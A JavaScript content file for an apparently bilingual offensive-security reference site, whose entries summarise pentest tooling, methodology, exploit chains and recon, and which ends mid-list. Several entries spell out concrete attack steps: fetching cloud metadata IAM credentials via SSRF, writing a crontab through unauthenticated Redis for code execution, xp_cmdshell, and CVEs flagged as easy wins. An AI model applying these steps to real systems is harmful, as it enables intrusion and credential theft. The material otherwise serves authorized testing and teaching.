/**
 * VORNAC Research — curated reference index.
 *
 * Source: a 265-entry corpus of offensive-security mindmaps and methodology
 * notes assembled in-house. Every entry was fingerprinted by SHA-256,
 * deduplicated across the source set, machine-extracted from diagrammatic
 * form, and manually re-titled in neutral English.
 *
 * The source set has since been editorially consolidated into 45 entries.
 * Where multiple source notes covered overlapping ground, they were merged
 * into a single richer entry so every entry can carry its own page.
 *
 * What this file does NOT carry:
 *   - source identifiers, attribution, or upstream filenames
 *   - non-Latin script of any kind
 *   - internal phase nomenclature — phase labels are rendered in
 *     plain English ("XSS", "SQL Injection", "Recon")
 *   - dated artifacts (year-only or version-only titles)
 *
 * Entries are intentionally hand-titled and hand-blurbed so the index
 * reads like a library catalog, not a scraped dump.
 *
 * Structure:
 *   - DOMAINS        the 8 macro-domains shown on the page
 *   - PHASES         readable labels for the 24 mapped engagement phases
 *   - NOTES          curated entries (Tier 1 = featured, Tier 2 = reference,
 *                    Tier 3 = background). Each note has both a `blurb`
 *                    (one sentence, listing card) and a `body` (3-5
 *                    paragraphs, used on the detail page).
 *   - module.exports returns a derived shape with counts, grouped notes,
 *     a flat list ready for pagination, and a noteById lookup map.
 */

const DOMAINS = [
  {
    id: "offensive-tradecraft",
    number: "1",
    title: { en: "Offensive Tradecraft",            de: "Offensive Tradecraft" },
    blurb: {
      en: "Methodologies, frameworks, and red-team playbooks. The how-we-test layer.",
      de: "Methodiken, Frameworks und Red-Team-Playbooks. Die Wie-wir-testen-Ebene."
    }
  },
  {
    id: "application-identity",
    number: "2",
    title: { en: "Application & Identity Security", de: "Anwendungs- & Identitätssicherheit" },
    blurb: {
      en: "OWASP-adjacent vulnerability classes — from XSS to business logic flaws.",
      de: "OWASP-nahe Schwachstellenklassen — von XSS bis Business-Logic-Fehlern."
    }
  },
  {
    id: "cloud-infrastructure",
    number: "3",
    title: { en: "Cloud & Modern Infrastructure",   de: "Cloud & moderne Infrastruktur" },
    blurb: {
      en: "Public-cloud security models and enterprise architecture patterns.",
      de: "Public-Cloud-Sicherheitsmodelle und Enterprise-Architektur-Muster."
    }
  },
  {
    id: "ot-embedded",
    number: "4",
    title: { en: "Operational Technology & Embedded", de: "Operational Technology & Embedded" },
    blurb: {
      en: "Surfaces outside conventional IT: ICS/SCADA, IoT, automotive, wireless.",
      de: "Angriffsflächen jenseits klassischer IT: ICS/SCADA, IoT, Automotive, Wireless."
    }
  },
  {
    id: "threat-intelligence",
    number: "5",
    title: { en: "Threat Intelligence & Adversary Modeling", de: "Threat Intelligence & Adversary Modeling" },
    blurb: {
      en: "Diamond model, kill chains, attribution, and threat modeling.",
      de: "Diamond Model, Kill Chains, Attribution und Threat Modeling."
    }
  },
  {
    id: "reverse-malware",
    number: "6",
    title: { en: "Reverse Engineering, Binary & Malware", de: "Reverse Engineering, Binary & Malware" },
    blurb: {
      en: "Low-level attack surfaces — exploitation, fuzzing, and malware behavior.",
      de: "Tieferliegende Angriffsflächen — Exploitation, Fuzzing und Malware-Verhalten."
    }
  },
  {
    id: "ai-emerging",
    number: "7",
    title: { en: "AI, Data & Emerging Risk",         de: "KI, Daten & neue Risiken" },
    blurb: {
      en: "Machine-learning security, blockchain, and data-layer threats.",
      de: "Sicherheit von Machine Learning, Blockchain und Daten-Layer-Bedrohungen."
    }
  },
  {
    id: "defensive-ops",
    number: "8",
    title: { en: "Defensive Operations & Governance", de: "Defensive Operations & Governance" },
    blurb: {
      en: "Blue-team operations, the security-product landscape, and compliance posture.",
      de: "Blue-Team-Operationen, Security-Produkt-Landschaft und Compliance-Haltung."
    }
  }
];

const PHASES = {
  "osint":             { en: "OSINT",                de: "OSINT" },
  "recon":             { en: "Recon",                de: "Recon" },
  "dir-fuzz":          { en: "Directory Fuzzing",    de: "Directory Fuzzing" },
  "fingerprint":       { en: "Fingerprinting",       de: "Fingerprinting" },
  "auth":              { en: "Authentication",       de: "Authentifizierung" },
  "session":           { en: "Session Mgmt",         de: "Session-Mgmt" },
  "auth-bypass":       { en: "Auth Bypass",          de: "Auth-Bypass" },
  "xss":               { en: "XSS",                  de: "XSS" },
  "dom-xss":           { en: "DOM XSS",              de: "DOM-XSS" },
  "csrf":              { en: "CSRF",                 de: "CSRF" },
  "sqli":              { en: "SQL Injection",        de: "SQL-Injection" },
  "cmd-injection":     { en: "Command Injection",    de: "Command Injection" },
  "ssrf":              { en: "SSRF",                 de: "SSRF" },
  "deserialization":   { en: "Deserialization",      de: "Deserialisierung" },
  "upload":            { en: "File Upload",          de: "File Upload" },
  "xxe":               { en: "XXE / Path Traversal", de: "XXE / Path Traversal" },
  "idor":              { en: "IDOR",                 de: "IDOR" },
  "biz-logic":         { en: "Business Logic",       de: "Business Logic" },
  "api":               { en: "API Security",         de: "API-Sicherheit" },
  "cors-tls-jwt":      { en: "CORS / TLS / JWT",     de: "CORS / TLS / JWT" },
  "misconfig":         { en: "Misconfiguration",     de: "Fehlkonfiguration" },
  "cves":              { en: "Known CVEs",           de: "Bekannte CVEs" },
  "report":            { en: "Reporting",            de: "Reporting" },
  "methodology":       { en: "Methodology",          de: "Methodik" }
};

const T = (en, de) => ({ en, de });

/**
 * Body helper. Multi-paragraph content split on double newline.
 * Each paragraph is plain text — no HTML.
 */
const B = (en, de) => ({ en: en.trim(), de: de.trim() });

const NOTES = [
  // ─────────────────────────────────────────────────────────────
  // 01 — OFFENSIVE TRADECRAFT
  // ─────────────────────────────────────────────────────────────
  {
    id: "comprehensive-pentest-reference",
    domain: "offensive-tradecraft", tier: 1,
    title: T("Comprehensive Pentest Reference", "Umfassende Pentest-Referenz"),
    blurb: T(
      "Three-column reference combining a tooling catalog, a vulnerability-class checklist, and a per-service CVE matrix. The most concrete tooling reference in the index.",
      "Drei-Spalten-Referenz aus Tool-Katalog, Schwachstellenklassen-Checkliste und CVE-Matrix pro Dienst. Die konkreteste Tool-Referenz im Index."
    ),
    body: B(
      `
<h2>Default tool per task</h2>
<ul>
  <li><strong>Port discovery.</strong> <code>nmap</code> for accuracy, <code>masscan</code> first when the IP range is &gt;/22 to bound timing.</li>
  <li><strong>Web content discovery.</strong> <code>ffuf</code> with a tuned wordlist (SecLists <code>raft-large</code> as default), <code>katana</code> for JS-rendered routes, <code>waybackurls</code> for historic paths.</li>
  <li><strong>Web vuln scan.</strong> <code>nuclei</code> with the public template tree, scoped to fingerprinted tech. Never run the full tree blind.</li>
  <li><strong>Authentication abuse.</strong> <code>hydra</code> for service brute-force, <code>kerbrute</code> for AD username enum and password spray, <code>CrackMapExec</code> for SMB/LDAP/MSSQL.</li>
  <li><strong>Web exploitation.</strong> Burp Suite for manual, <code>sqlmap</code> for confirmed SQLi extraction.</li>
  <li><strong>Post-exploitation.</strong> <code>impacket</code> suite (secretsdump, wmiexec, smbexec) on Linux ops boxes; <code>Rubeus</code> + <code>SharpHound</code> on Windows footholds.</li>
</ul>

<h2>Vulnerability classes worth memorizing</h2>
<p>OWASP Top 10 covers the highest-volume classes. Non-OWASP classes that recur in real engagements:</p>
<ul>
  <li><strong>Untrusted deserialization.</strong> Java (ysoserial gadgets), .NET (ysoserial.net), Python pickle, PHP unserialize.</li>
  <li><strong>SSRF chains.</strong> Cloud metadata (<code>169.254.169.254</code>), internal Redis, gopher:// for protocol smuggling.</li>
  <li><strong>JWT confusion.</strong> <code>alg: none</code>, HS256 signed with RSA public key, key-ID directory traversal.</li>
  <li><strong>Race conditions.</strong> Single-request multi-packet (RFC 7230 §3.3.3), business-logic windows around money movement.</li>
  <li><strong>Server-side template injection.</strong> Jinja2, Twig, Velocity, FreeMarker — distinct payload syntax per engine.</li>
</ul>

<h2>Banner → first-look CVE clusters</h2>
<ul>
  <li><strong>Apache HTTPD &lt; 2.4.50.</strong> CVE-2021-41773 path traversal; instant win if mod-cgi enabled.</li>
  <li><strong>Atlassian Confluence.</strong> CVE-2022-26134 OGNL injection on any Confluence pre-7.18.</li>
  <li><strong>Microsoft Exchange.</strong> ProxyShell (CVE-2021-34473 et al.), ProxyNotShell (CVE-2022-41040 + 41082).</li>
  <li><strong>VMware vCenter.</strong> Log4Shell vectors on pre-patch builds; vSphere Client SSRF.</li>
  <li><strong>Citrix NetScaler/Gateway.</strong> CVE-2023-3519 unauthenticated RCE on internet-facing instances.</li>
  <li><strong>Ivanti Connect Secure.</strong> CVE-2024-21887 + 46805 auth bypass + command injection.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>Banner first, exploit second. Confirm the version, confirm the patch level, then choose the chain. Skipping the confirmation step is how testers fire exploits at hardened targets and burn detection time for nothing.</div>
`,
      `
<h2>Standard-Tool pro Aufgabe</h2>
<ul>
  <li><strong>Port-Discovery.</strong> <code>nmap</code> für Präzision, <code>masscan</code> zuerst wenn der IP-Bereich &gt;/22 ist, um Timing zu begrenzen.</li>
  <li><strong>Web-Content-Discovery.</strong> <code>ffuf</code> mit getunter Wordlist (SecLists <code>raft-large</code> als Standard), <code>katana</code> für JS-gerenderte Routen, <code>waybackurls</code> für historische Pfade.</li>
  <li><strong>Web-Vuln-Scan.</strong> <code>nuclei</code> mit dem öffentlichen Template-Baum, scoped auf fingerprintete Tech. Niemals den vollen Baum blind laufen lassen.</li>
  <li><strong>Authentifizierungs-Missbrauch.</strong> <code>hydra</code> für Service-Brute-Force, <code>kerbrute</code> für AD-Username-Enum und Password-Spray, <code>CrackMapExec</code> für SMB/LDAP/MSSQL.</li>
  <li><strong>Web-Exploitation.</strong> Burp Suite für manuell, <code>sqlmap</code> für bestätigte SQLi-Extraktion.</li>
  <li><strong>Post-Exploitation.</strong> <code>impacket</code>-Suite (secretsdump, wmiexec, smbexec) auf Linux-Ops-Boxen; <code>Rubeus</code> + <code>SharpHound</code> auf Windows-Footholds.</li>
</ul>

<h2>Merkenswerte Schwachstellenklassen</h2>
<p>OWASP Top 10 deckt die volumenstärksten Klassen. Nicht-OWASP-Klassen, die in echten Engagements wiederkehren:</p>
<ul>
  <li><strong>Untrusted Deserialization.</strong> Java (ysoserial-Gadgets), .NET (ysoserial.net), Python pickle, PHP unserialize.</li>
  <li><strong>SSRF-Ketten.</strong> Cloud-Metadata (<code>169.254.169.254</code>), internes Redis, gopher:// für Protokoll-Smuggling.</li>
  <li><strong>JWT-Confusion.</strong> <code>alg: none</code>, HS256 signiert mit RSA-Public-Key, Key-ID-Directory-Traversal.</li>
  <li><strong>Race Conditions.</strong> Single-Request-Multi-Packet (RFC 7230 §3.3.3), Business-Logic-Fenster bei Geld-Bewegungen.</li>
  <li><strong>Server-Side Template Injection.</strong> Jinja2, Twig, Velocity, FreeMarker — pro Engine eigene Payload-Syntax.</li>
</ul>

<h2>Banner → erste CVE-Cluster</h2>
<ul>
  <li><strong>Apache HTTPD &lt; 2.4.50.</strong> CVE-2021-41773 Path-Traversal; sofortiger Win wenn mod-cgi aktiv.</li>
  <li><strong>Atlassian Confluence.</strong> CVE-2022-26134 OGNL-Injection auf jedem Confluence vor 7.18.</li>
  <li><strong>Microsoft Exchange.</strong> ProxyShell (CVE-2021-34473 ff.), ProxyNotShell (CVE-2022-41040 + 41082).</li>
  <li><strong>VMware vCenter.</strong> Log4Shell-Vektoren auf Pre-Patch-Builds; vSphere-Client-SSRF.</li>
  <li><strong>Citrix NetScaler/Gateway.</strong> CVE-2023-3519 unauthentifizierte RCE auf internetzugänglichen Instanzen.</li>
  <li><strong>Ivanti Connect Secure.</strong> CVE-2024-21887 + 46805 Auth-Bypass + Command-Injection.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Banner zuerst, Exploit zweitens. Version bestätigen, Patch-Level bestätigen, dann die Kette wählen. Diesen Schritt zu überspringen ist, wie Tester Exploits gegen gehärtete Ziele feuern und Detektionszeit für nichts verbrennen.</div>
`
    ),
    phases: ["recon", "fingerprint", "xss", "sqli", "cmd-injection", "ssrf", "upload", "cves"]
  },
  {
    id: "pentest-methodology-canon",
    domain: "offensive-tradecraft", tier: 1,
    title: T("Pentest Methodology — Canonical Reference", "Pentest-Methodik — kanonische Referenz"),
    blurb: T(
      "PTES, the craft notes on engagement sequencing, and the web-application methodology variants — consolidated into one navigable reference.",
      "PTES, handwerkliche Notizen zur Engagement-Sequenz und die Web-App-Methodik-Varianten — konsolidiert in einer navigierbaren Referenz."
    ),
    body: B(
      `
<h2>PTES — the seven phases</h2>
<ol>
  <li><strong>Pre-engagement.</strong> Scope, rules of engagement, blackout windows, comms channel, deconfliction process, in-scope and out-of-scope assets in writing.</li>
  <li><strong>Intelligence gathering.</strong> Passive OSINT first, then active recon. Hand off to vulnerability analysis only after the attack surface is mapped.</li>
  <li><strong>Threat modeling.</strong> Identify the assets that matter to the client and the adversary types that target them. Reject scope items that don't move the needle.</li>
  <li><strong>Vulnerability analysis.</strong> Map identified surface to known classes. Triage by impact × exploitability, not by scanner severity.</li>
  <li><strong>Exploitation.</strong> Validate findings with the minimum proof of impact that survives the client's review. No client data exfiltrated beyond agreed limits.</li>
  <li><strong>Post-exploitation.</strong> Persistence (if scoped), lateral movement, data discovery. Document every step in real time — you will not remember it Friday.</li>
  <li><strong>Reporting.</strong> Executive summary first, technical detail second, reproduction steps third. Remediation guidance per finding, not a generic appendix.</li>
</ol>

<h2>Engagement archetype → method shape</h2>
<ul>
  <li><strong>External black-box.</strong> Heavy on recon and OSINT. Spend 30–40% of budget there. Assume detection.</li>
  <li><strong>Internal assumed-breach.</strong> Skip recon, start with credential plumbing and AD enumeration. <code>BloodHound</code> on day one.</li>
  <li><strong>Web-app grey-box.</strong> Walk every authenticated role end to end before probing for vulns. Business logic is the highest-value class.</li>
  <li><strong>Red team / objective-based.</strong> Define detection budget upfront. Every tool choice trades stealth against time. Deconfliction call template must exist before kickoff.</li>
</ul>

<h2>Day-rhythm of a senior tester</h2>
<ul>
  <li><strong>Morning.</strong> Re-read yesterday's notes. Pick the single most promising thread and pursue it for two hours before context-switching.</li>
  <li><strong>Midday.</strong> Update the running findings log. A finding without a screenshot is a finding that will be argued.</li>
  <li><strong>Afternoon.</strong> Tooling, automation, broad scans that need wall-clock time. Triage results as they land.</li>
  <li><strong>End of day.</strong> Five-line status note to the engagement channel: what was done, what was found, what's blocked, what's next, when next status.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>If the methodology says one thing and the target says another, the target wins. Tear up the plan and write it again. The methodology is a starting position, not a contract.</div>
`,
      `
<h2>PTES — die sieben Phasen</h2>
<ol>
  <li><strong>Pre-Engagement.</strong> Scope, Rules of Engagement, Blackout-Fenster, Kommunikationskanal, Deconfliction-Prozess, In-Scope- und Out-of-Scope-Assets schriftlich.</li>
  <li><strong>Intelligence Gathering.</strong> Erst passives OSINT, dann aktive Recon. Übergabe an Vulnerability Analysis erst, wenn die Angriffsfläche gemapped ist.</li>
  <li><strong>Threat Modeling.</strong> Identifiziere die Assets, die für den Kunden zählen, und die Adversary-Typen, die sie angreifen. Lehne Scope-Items ab, die keinen Unterschied machen.</li>
  <li><strong>Vulnerability Analysis.</strong> Mappe identifizierte Oberfläche auf bekannte Klassen. Triagiere nach Impact × Ausnutzbarkeit, nicht nach Scanner-Severity.</li>
  <li><strong>Exploitation.</strong> Validiere Befunde mit dem minimalen Impact-Nachweis, der das Kunden-Review übersteht. Keine Kundendaten über die vereinbarten Grenzen hinaus exfiltriert.</li>
  <li><strong>Post-Exploitation.</strong> Persistenz (falls scoped), Lateral Movement, Data Discovery. Dokumentiere jeden Schritt in Echtzeit — am Freitag erinnerst du dich nicht mehr.</li>
  <li><strong>Reporting.</strong> Executive Summary zuerst, technische Details zweitens, Reproduktions-Schritte drittens. Remediation-Guidance pro Befund, kein generischer Anhang.</li>
</ol>

<h2>Engagement-Archetyp → Methodenform</h2>
<ul>
  <li><strong>External Black-Box.</strong> Schwergewicht auf Recon und OSINT. 30–40% des Budgets dort verbringen. Mit Detektion rechnen.</li>
  <li><strong>Internal Assumed-Breach.</strong> Recon überspringen, mit Credential-Plumbing und AD-Enumeration starten. <code>BloodHound</code> an Tag eins.</li>
  <li><strong>Web-App Grey-Box.</strong> Jede authentifizierte Rolle End-to-End durchgehen, bevor auf Vulns gefuzzt wird. Business Logic ist die Klasse mit dem höchsten Wert.</li>
  <li><strong>Red Team / objektivbasiert.</strong> Detektionsbudget vorab definieren. Jede Tool-Wahl tauscht Stealth gegen Zeit. Deconfliction-Call-Template muss vor Kickoff stehen.</li>
</ul>

<h2>Tagesrhythmus eines erfahrenen Testers</h2>
<ul>
  <li><strong>Morgens.</strong> Notizen von gestern nochmal lesen. Den vielversprechendsten Thread wählen und zwei Stunden ohne Kontextwechsel verfolgen.</li>
  <li><strong>Mittags.</strong> Den laufenden Findings-Log aktualisieren. Ein Befund ohne Screenshot ist ein Befund, der bestritten wird.</li>
  <li><strong>Nachmittags.</strong> Tooling, Automatisierung, breite Scans, die Wall-Clock-Zeit brauchen. Ergebnisse beim Eintreffen triagieren.</li>
  <li><strong>Tagesende.</strong> Fünf-Zeilen-Status in den Engagement-Channel: was gemacht, was gefunden, was blockiert, was als nächstes, wann nächster Status.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Wenn die Methodik eine Sache sagt und das Ziel etwas anderes, gewinnt das Ziel. Plan zerreißen, neu schreiben. Die Methodik ist eine Startposition, kein Vertrag.</div>
`
    ),
    phases: ["methodology", "recon", "report"]
  },
  {
    id: "advanced-pentest-and-redteam",
    domain: "offensive-tradecraft", tier: 1,
    title: T("Advanced Penetration Testing & Red Team", "Advanced Pentest & Red Team"),
    blurb: T(
      "Past the OWASP basics: chained exploitation, air-gapped lab setup for payload trials, and the operating notes for full-scope adversary simulation.",
      "Jenseits der OWASP-Basics: verkettete Exploitation, Air-gapped Lab-Aufbau für Payload-Tests und die operativen Notizen zur Adversary-Simulation."
    ),
    body: B(
      `
<h2>Chain patterns we see in production</h2>
<ul>
  <li><strong>Info disclosure → deserialization → RCE.</strong> Stack trace leaks Java framework version; ysoserial CommonsCollections1 against the exposed RMI/JMX endpoint; shell as the app-server user.</li>
  <li><strong>SSRF → cloud IAM compromise.</strong> Web app fetches user-supplied URL; fetch <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>; assume the role; pivot via <code>aws sts assume-role</code> across trust relationships.</li>
  <li><strong>LDAP injection → AD enumeration → Kerberoast.</strong> Login form passes <code>(uid=*)</code> unfiltered into LDAP filter; enumerate users; spray weak passwords; Kerberoast surviving service accounts.</li>
  <li><strong>Subdomain takeover → cookie scope abuse.</strong> Dangling CNAME to a deprovisioned SaaS; register the SaaS resource; set cookies under the parent domain; session-fixation against authenticated users.</li>
  <li><strong>Cache poisoning → stored XSS → admin takeover.</strong> Unkeyed header reflected into cached response; poison the admin-panel HTML; admin browser executes payload; privilege escalation via admin-only IDOR.</li>
</ul>

<h2>Lab discipline for payload development</h2>
<ul>
  <li><strong>Hypervisor pinning.</strong> ESXi or Proxmox host, no internet-facing management. VLAN tagging at the switch, not the VM. Never trust VM-level isolation alone.</li>
  <li><strong>Three-tier topology.</strong> Build network (internet), staging network (mirrors target tech stack), payload network (air-gapped, all outbound dropped at the gateway).</li>
  <li><strong>Snapshot before every run.</strong> Power off, snapshot, power on. Revert after each test cycle. Snapshots are cheap; not having one is expensive.</li>
  <li><strong>Out-of-band C2 only.</strong> Lab payloads use lab callback hosts only. Production C2 infrastructure never touches lab payloads — separate certs, separate domains, separate VPS.</li>
</ul>

<h2>Red team operating model</h2>
<ul>
  <li><strong>Objectives in writing.</strong> "Reach the SAP database" or "demonstrate access to the wire-transfer system" — never "find vulnerabilities".</li>
  <li><strong>White cell.</strong> Trusted client contact who knows the engagement is live, available 24/7 for deconfliction. Phone + Signal, not email.</li>
  <li><strong>Evasion budget.</strong> Tolerated IOC count agreed upfront. EDR alerts above the budget = pause and reassess, not escalate.</li>
  <li><strong>After-action.</strong> Joint replay with the blue team. Walk every step, every alert that fired, every alert that should have fired. The engagement's value is in this session, not in the PDF.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>Chains compound. Two medium findings can produce a critical. Always sketch what each finding could chain into before triaging severity in isolation.</div>
`,
      `
<h2>Chain-Muster aus der Produktion</h2>
<ul>
  <li><strong>Info-Disclosure → Deserialisierung → RCE.</strong> Stack-Trace verrät Java-Framework-Version; ysoserial CommonsCollections1 gegen den exponierten RMI-/JMX-Endpunkt; Shell als App-Server-User.</li>
  <li><strong>SSRF → Cloud-IAM-Kompromittierung.</strong> Web-App holt user-gelieferte URL; <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> abrufen; Rolle übernehmen; via <code>aws sts assume-role</code> über Trust-Relationships pivotieren.</li>
  <li><strong>LDAP-Injection → AD-Enumeration → Kerberoast.</strong> Login-Form gibt <code>(uid=*)</code> ungefiltert in den LDAP-Filter; User enumerieren; schwache Passwörter sprayen; überlebende Service-Accounts kerberoasten.</li>
  <li><strong>Subdomain-Takeover → Cookie-Scope-Missbrauch.</strong> Dangling CNAME auf eine deprovisionierte SaaS; SaaS-Ressource registrieren; Cookies unter der Parent-Domain setzen; Session-Fixation gegen authentifizierte User.</li>
  <li><strong>Cache-Poisoning → Stored XSS → Admin-Takeover.</strong> Ungekeyter Header in gecachte Response reflektiert; Admin-Panel-HTML vergiften; Admin-Browser führt Payload aus; Privilegienerhöhung über Admin-only IDOR.</li>
</ul>

<h2>Lab-Disziplin für Payload-Entwicklung</h2>
<ul>
  <li><strong>Hypervisor-Pinning.</strong> ESXi- oder Proxmox-Host, kein internetzugängliches Management. VLAN-Tagging am Switch, nicht in der VM. Niemals nur VM-Level-Isolation vertrauen.</li>
  <li><strong>Drei-Stufen-Topologie.</strong> Build-Netz (Internet), Staging-Netz (spiegelt Ziel-Tech-Stack), Payload-Netz (air-gapped, alles Outbound am Gateway gedroppt).</li>
  <li><strong>Snapshot vor jedem Lauf.</strong> Aus, Snapshot, an. Nach jedem Testzyklus zurücksetzen. Snapshots sind billig; keinen zu haben ist teuer.</li>
  <li><strong>Nur Out-of-Band-C2.</strong> Lab-Payloads nutzen nur Lab-Callback-Hosts. Produktions-C2-Infrastruktur berührt nie Lab-Payloads — eigene Certs, eigene Domains, eigene VPS.</li>
</ul>

<h2>Red-Team-Operating-Model</h2>
<ul>
  <li><strong>Ziele schriftlich.</strong> "SAP-Datenbank erreichen" oder "Zugriff auf Wire-Transfer-System nachweisen" — nie "Schwachstellen finden".</li>
  <li><strong>White Cell.</strong> Vertrauenswürdiger Kunden-Kontakt, der weiß, dass das Engagement läuft, 24/7 für Deconfliction verfügbar. Telefon + Signal, nicht E-Mail.</li>
  <li><strong>Evasion-Budget.</strong> Tolerierte IOC-Anzahl vorab vereinbart. EDR-Alerts über dem Budget = Pause und Neubewertung, nicht Eskalation.</li>
  <li><strong>After-Action.</strong> Gemeinsamer Replay mit Blue-Team. Jeden Schritt durchgehen, jeden Alert, der gefeuert hat, jeden, der hätte feuern sollen. Der Wert des Engagements steckt in dieser Session, nicht im PDF.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Ketten verstärken sich. Zwei mittlere Befunde können einen kritischen ergeben. Immer skizzieren, wozu jeder Befund verkettet werden könnte, bevor Severity isoliert triagiert wird.</div>
`
    ),
    phases: ["methodology", "cves", "report"]
  },
  {
    id: "recon-and-discovery",
    domain: "offensive-tradecraft", tier: 1,
    title: T("Recon & Discovery", "Recon & Discovery"),
    blurb: T(
      "The recon catalog end-to-end: passive vs. active modes, subdomain discovery across CT logs and DNS, web-stack fingerprinting, and port-to-service mapping.",
      "Der Recon-Katalog von A bis Z: passive vs. aktive Modi, Subdomain-Erkennung über CT-Logs und DNS, Web-Stack-Fingerprinting und Port-zu-Service-Mapping."
    ),
    body: B(
      `
<h2>Recon modes</h2>
<ul>
  <li><strong>Passive.</strong> No packets to the target. Sources: <code>crt.sh</code>, Shodan, Censys, FOFA, BGP toolkit, GitHub code search, Wayback Machine. Required mode for stealth engagements and competitive intel work.</li>
  <li><strong>Semi-passive.</strong> Traffic that looks like normal user behavior: a single HTTP GET, a single DNS lookup. Tolerated under most engagement scopes without explicit scan authorization.</li>
  <li><strong>Active.</strong> Port scans, directory fuzzing, wordlist-driven enumeration. Requires written scope authorization and ideally a maintenance window.</li>
</ul>

<h2>Subdomain discovery — full pipeline</h2>
<ol>
  <li><strong>CT logs.</strong> <code>crt.sh?q=%25.target.com</code>, <code>subfinder</code> with all sources enabled. Catches anything ever issued a public cert.</li>
  <li><strong>DNS bruteforce.</strong> <code>shuffledns</code> or <code>puredns</code> with the SecLists <code>n0kovo_subdomains</code> wordlist against a custom resolver list to avoid rate-limit. Handle wildcards explicitly.</li>
  <li><strong>ASN walk.</strong> Lookup AS number via <code>whois</code> or <code>asnlookup</code>; sweep the entire ASN range; reverse-DNS to find neighbors not in the public zone.</li>
  <li><strong>JS scraping.</strong> <code>katana</code> + <code>subjs</code> to extract URLs from JavaScript bundles. Frontends frequently hardcode internal-only API hostnames.</li>
  <li><strong>Archive mining.</strong> <code>waybackurls</code>, <code>gau</code>. Historic hosts that no longer resolve still indicate naming conventions.</li>
</ol>

<h2>Web fingerprinting signals</h2>
<ul>
  <li><strong>Headers.</strong> <code>Server</code>, <code>X-Powered-By</code>, <code>Set-Cookie</code> names (<code>PHPSESSID</code>, <code>JSESSIONID</code>, <code>ASP.NET_SessionId</code>), CSP directives.</li>
  <li><strong>Favicon hash.</strong> MD5 of <code>/favicon.ico</code> → Shodan <code>http.favicon.hash:</code>. Identifies products by their default icon even when banners are stripped.</li>
  <li><strong>Error pages.</strong> 404, 500, and parser-error pages have product-specific wording that survives header scrubbing.</li>
  <li><strong>Behavioral probe.</strong> Request <code>/.env</code>, <code>/server-status</code>, <code>/actuator/health</code>, <code>/api/v1</code>. Response codes and bodies fingerprint the stack.</li>
</ul>

<h2>Port → first-look service</h2>
<ul>
  <li><strong>21 FTP.</strong> Anonymous read first, banner second. Check writable directories.</li>
  <li><strong>22 SSH.</strong> Banner reveals OS family; <code>ssh-audit</code> for KEX/MAC posture; userlist enum via timing on old OpenSSH.</li>
  <li><strong>445 SMB.</strong> <code>crackmapexec smb</code> for null-session, signing, OS version, share enum.</li>
  <li><strong>389/636 LDAP.</strong> Anonymous bind first; root DSE for naming context; userPrincipalName enumeration.</li>
  <li><strong>1433 MSSQL.</strong> <code>mssqlclient.py -windows-auth</code> with sprayed creds; <code>xp_cmdshell</code> if sysadmin.</li>
  <li><strong>3389 RDP.</strong> <code>nmap --script rdp-enum-encryption</code> for NLA posture; never brute-force without lockout policy confirmed.</li>
  <li><strong>5985/5986 WinRM.</strong> <code>evil-winrm</code> with sprayed creds. If admin, you have a shell with no AV-touching binary.</li>
  <li><strong>6379 Redis.</strong> Unauthenticated by default. <code>config set dir /var/spool/cron/</code> + crontab write for RCE.</li>
  <li><strong>27017 MongoDB.</strong> Unauthenticated in default Docker images. <code>mongosh</code> + show dbs.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>The cheapest find of the engagement is usually in the recon phase. Spend the time. A subdomain nobody on the security team knows exists is worth more than three exotic exploits against a hardened main app.</div>
`,
      `
<h2>Recon-Modi</h2>
<ul>
  <li><strong>Passiv.</strong> Keine Pakete zum Ziel. Quellen: <code>crt.sh</code>, Shodan, Censys, FOFA, BGP-Toolkit, GitHub-Code-Search, Wayback Machine. Pflichtmodus für Stealth-Engagements und Competitive-Intel.</li>
  <li><strong>Semi-passiv.</strong> Traffic, der wie normales User-Verhalten aussieht: ein einzelner HTTP-GET, ein einzelner DNS-Lookup. Unter den meisten Engagement-Scopes ohne explizite Scan-Autorisierung toleriert.</li>
  <li><strong>Aktiv.</strong> Port-Scans, Directory-Fuzzing, wordlist-getriebene Enumeration. Erfordert schriftliche Scope-Autorisierung und idealerweise ein Wartungsfenster.</li>
</ul>

<h2>Subdomain-Discovery — volle Pipeline</h2>
<ol>
  <li><strong>CT-Logs.</strong> <code>crt.sh?q=%25.target.com</code>, <code>subfinder</code> mit allen Quellen aktiv. Fängt alles, wofür je ein öffentliches Cert ausgestellt wurde.</li>
  <li><strong>DNS-Bruteforce.</strong> <code>shuffledns</code> oder <code>puredns</code> mit der SecLists-<code>n0kovo_subdomains</code>-Wordlist gegen eine eigene Resolver-Liste, um Rate-Limits zu umgehen. Wildcards explizit behandeln.</li>
  <li><strong>ASN-Walk.</strong> AS-Nummer via <code>whois</code> oder <code>asnlookup</code>; gesamten ASN-Bereich sweepen; Reverse-DNS, um Nachbarn außerhalb der öffentlichen Zone zu finden.</li>
  <li><strong>JS-Scraping.</strong> <code>katana</code> + <code>subjs</code>, um URLs aus JavaScript-Bundles zu extrahieren. Frontends hardcodieren häufig nur-interne API-Hostnames.</li>
  <li><strong>Archive-Mining.</strong> <code>waybackurls</code>, <code>gau</code>. Historische Hosts, die nicht mehr auflösen, verraten trotzdem Naming-Konventionen.</li>
</ol>

<h2>Web-Fingerprinting-Signale</h2>
<ul>
  <li><strong>Headers.</strong> <code>Server</code>, <code>X-Powered-By</code>, <code>Set-Cookie</code>-Namen (<code>PHPSESSID</code>, <code>JSESSIONID</code>, <code>ASP.NET_SessionId</code>), CSP-Direktiven.</li>
  <li><strong>Favicon-Hash.</strong> MD5 von <code>/favicon.ico</code> → Shodan <code>http.favicon.hash:</code>. Identifiziert Produkte über ihr Default-Icon, auch wenn Banner gestrippt sind.</li>
  <li><strong>Error-Pages.</strong> 404, 500 und Parser-Error-Pages haben produktspezifisches Wording, das Header-Scrubbing übersteht.</li>
  <li><strong>Verhaltensprobe.</strong> Request <code>/.env</code>, <code>/server-status</code>, <code>/actuator/health</code>, <code>/api/v1</code>. Response-Codes und Bodies fingerprinten den Stack.</li>
</ul>

<h2>Port → erster Dienst-Blick</h2>
<ul>
